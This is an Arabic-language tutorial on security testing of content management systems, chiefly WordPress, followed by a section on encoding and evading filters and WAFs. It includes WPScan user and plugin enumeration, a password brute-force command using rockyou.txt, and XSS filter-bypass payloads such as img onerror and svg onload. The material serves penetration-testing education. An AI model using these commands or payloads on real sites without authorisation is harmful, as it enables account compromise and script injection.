CMS هي أنظمة بتُستخدم لإنشاء وإدارة المحتوى على الإنترنت بسهولة، من غير الحاجة لكتابة كود. أمثلة: WordPress، Joomla، Drupal.

مزاياها: سهولة الاستخدام، قوالب جاهزة، وإمكانية إضافة ميزات عبر الإضافات (Plugins).

مقدمة في اختبار أمان CMS

CMS هدف شائع للهجمات، لأن مواقع كتيرة جدًا بتستخدمها. الهجمات الممكنة تشمل SQL Injection، XSS، ورفع الملفات الضارة. أهمية الاختبار هنا هي اكتشاف الثغرات قبل ما المهاجمين يستغلوها.

منهجية اختبار أمان CMS
جمع المعلومات: معرفة معلومات عن النظام، الإصدارات، والإضافات المستخدمة
التحليل: تحليل التطبيق بحثًا عن الثغرات المعروفة
الاختبار: تنفيذ اختبارات الأمان زي اختبار الاختراق الفعلي
الإبلاغ: توثيق الثغرات واقتراح حلول
منهجية اختبار أمان WordPress
تحديد الهدف: فهم إزاي WordPress بيشتغل
جمع المعلومات: استخدام أدوات زي WPScan لجمع معلومات عن النسخة، الإضافات، والثيمات
تنفيذ الاختبارات: اختبار الثغرات زي SQL Injection وXSS
جمع المعلومات والتعداد في WordPress
التعرف على النسخة: فحص رؤوس HTTP، واستخدام WPScan
البحث عن الإضافات: معرفة الإضافات المثبتة وإصداراتها
التحقق من المستخدمين: استخدام تقنيات "User Enumeration" للحصول على معلومات عن المستخدمين

تثبيت واستخدام WPScan:

bash
sudo apt install wpscan
bash
wpscan --url http://example.com --enumerate u,vp,vt

الأمر ده بيطلع أسماء المستخدمين، الإضافات القابلة للاستغلال (vp = vulnerable plugins)، والثيمات القابلة للاستغلال (vt = vulnerable themes) في أمر واحد.

فحص الثغرات في WordPress
WPScan: لفحص الثغرات المعروفة في النسخة، الإضافات، والثيمات
Nessus: لفحص أمان النظام بشكل عام

تحليل النتائج: تحديد الثغرات ذات الأولوية وتوثيقها.

هجمات المصادقة في WordPress
Brute Force: محاولة تخمين كلمات المرور
Credential Stuffing: استخدام بيانات تسجيل دخول مسربة من مواقع تانية

الحماية: تطبيق مصادقة ثنائية (2FA)، واستخدام كلمات مرور قوية.

مثال عملي:

bash
wpscan --url http://example.com --usernames admin --passwords /usr/share/wordlists/rockyou.txt
استغلال إضافات WordPress

كيف يتم الاستغلال؟

ثغرات XSS: لو الإضافة مش بتتأكد من صحة المدخلات
SQL Injection: في حالة ضعف الأمان في استعلامات قاعدة البيانات

أدوات للتحليل: Burp Suite وOWASP ZAP.

مثال عملي: لقيت WPScan بيقول إن الموقع شغال عليه إضافة contact-form-x نسخة قديمة، وفيها ثغرة SQL Injection معروفة (CVE محدد). دورت على الـ Exploit المتاح ليها على Exploit-DB أو استخدمتها مباشرة عبر Metasploit لو متاح موديول جاهز.

اختبار الاختراق الأسود (Black-Box) في WordPress

الاختبار الأسود يعني إنك تبدأ بدون معرفة مسبقة بالبنية الداخلية للنظام.

الخطوات:

جمع المعلومات: استخدام أدوات زي Google Dorking وWPScan
تنفيذ الهجمات: استغلال الثغرات المعروفة أو تنفيذ هجمات SQL
توثيق النتائج: تسجيل الثغرات وأي معلومات حساسة حصلت عليها
10- Encoding & Filtering

السكشن ده بيغطي:

HTML Encoding
URL Encoding
Base64 Encoding
Bypassing Client-Side Filters
Bypassing Server-Side Filters
Web Application Firewalls (WAF) & Proxies
Evading WAFs, Proxies and IDSs
مقدمة
الترميز (Encoding): تحويل البيانات لصيغة أخرى لتسهيل نقلها أو تخزينها، ولتجنب الفهم غير المقصود للبيانات
التصفية (Filtering): يُستخدم للتحقق من المدخلات ومنع هجمات زي XSS وSQL Injection
التجنب (Evasion): تقنيات يستخدمها المهاجمون لتجاوز أنظمة الأمان (زي WAF) بأساليب غير متوقعة
ترميز HTML

يُستخدم لترميز الحروف الخاصة في HTML (زي <, >, &) إلى رموزها المعروفة (زي &lt;, &gt;, &amp;) لمنع تنفيذ أكواد JavaScript الضارة.

مثال: تحويل النص <script> إلى &lt;script&gt; ليظهر كنص عادي من غير تنفيذ.

ترميز URL

يُستخدم لتحويل الأحرف غير الصالحة في URL لصيغة صالحة، عن طريق استبدال الأحرف غير المتوافقة برموز تمثلها باستخدام %.

مثال: تحويل الفراغ لـ %20، أو رمز # لـ %23.

ترميز Base64

يُستخدم لتحويل البيانات الثنائية لسلسلة نصية من 64 رمز (A-Z, a-z, 0-9, +, /)، وبيُستخدم بشكل شائع في نقل البيانات عبر HTTP.

مثال:

bash
echo -n "Hello" | base64
# SGVsbG8=
تجاوز المرشحات على جانب العميل (Client-Side)
استخدام JavaScript لإدخال بيانات ضارة مباشرة على جانب العميل
استخدام HTML Encoding لإخفاء الأكواد عن أعين المدقق العادي
تجاوز المرشحات على جانب الخادم (Server-Side)
استغلال نقاط الضعف في كيفية معالجة الخادم للبيانات
استخدام SQL Injection لتجاوز تصفية المدخلات
إدخال رموز ترميز غير متوقعة ممكن تتعالج بشكل غلط
جدران حماية تطبيقات الويب (WAF) والوكلاء (Proxies)

WAF هي أنظمة تُستخدم لحماية تطبيقات الويب من هجمات معروفة زي XSS وSQL Injection. الوكلاء (Proxies) بيشتغلوا كوسيط بين المستخدم والخادم.

وظائفها: مراقبة وتحليل حركة البيانات، ومنع الطلبات الضارة بناءً على أنماط معروفة (Signatures).

تقنيات تجاوز WAFs والوكلاء والـ IDS
التشفير/الترميز: استخدام ترميزات مختلفة لتجاوز الكشف (زي ترميز الـ Payload بـ URL Encoding مضاعف)
التحوير: تغيير صيغة البيانات المدخلة لجعلها تبدو غير ضارة، زي استخدام حروف كبيرة وصغيرة مختلطة <ScRiPt>
تقنيات متعددة مجتمعة: استخدام أكتر من تقنية تجنب مع بعض في نفس الوقت لتجاوز الحماية

مثال عملي على تجاوز فلتر XSS بسيط:

لو الفلتر بيرفض <script> بالظبط، ممكن تجرب:

html
 ScRiPt>alert(1)</ScRiPt>
 img src=x onerror=alert(1)>
 svg onload=alert(1)>

كل شكل من دول بيحقق نفس الهدف بطريقة مختلفة، وده بيوضح ليه الاعتماد على فلتر بسيط بيبحث عن كلمة واحدة بالظبط مش كافي أبدًا كحماية حقيقية.